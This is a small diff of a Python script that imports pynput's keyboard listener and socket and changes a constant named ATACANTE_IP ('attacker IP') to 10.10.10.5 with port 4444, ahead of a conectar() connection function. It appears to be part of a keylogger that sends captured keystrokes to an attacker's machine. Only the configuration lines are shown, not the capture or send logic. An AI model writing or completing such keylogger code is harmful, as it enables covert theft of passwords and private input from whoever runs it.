@@ -2,7 +2,7 @@ from pynput import keyboard
 import socket
 import time
 
-ATACANTE_IP = "192.168.1.68"
+ATACANTE_IP = "10.10.10.5"
 ATACANTE_PUERTO = 4444
 
 def conectar():
